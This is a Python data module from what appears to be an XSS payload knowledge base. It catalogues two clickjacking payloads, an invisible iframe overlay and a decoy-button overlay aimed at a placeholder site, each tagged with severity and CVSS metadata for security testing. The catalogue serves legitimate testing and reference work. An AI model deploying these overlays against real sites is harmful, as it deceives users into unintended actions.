#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Clickjacking Payloads
"""

from ..models import PayloadEntry


CLICKJACK_PAYLOADS = {
    "click_1": PayloadEntry(
        payload="<style>iframe{position:absolute;opacity:0;z-index:1;width:100%;height:100%}</style><iframe src=//target.com>",
        contexts=["html_content", "css"],
        severity="high",
        cvss_score=7.5,
        description="Invisible iframe overlay",
        tags=["clickjacking", "iframe", "overlay"],
        reliability="medium",
    ),
    "click_2": PayloadEntry(
        payload="<div style='position:relative'><iframe src=//target.com style='opacity:0.1'></iframe><button style='position:absolute;top:50%;left:50%'>Click me</button></div>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Button overlay clickjacking",
        tags=["clickjacking", "button", "overlay"],
        reliability="medium",
    ),
}

CLICKJACK_PAYLOADS_TOTAL = len(CLICKJACK_PAYLOADS)
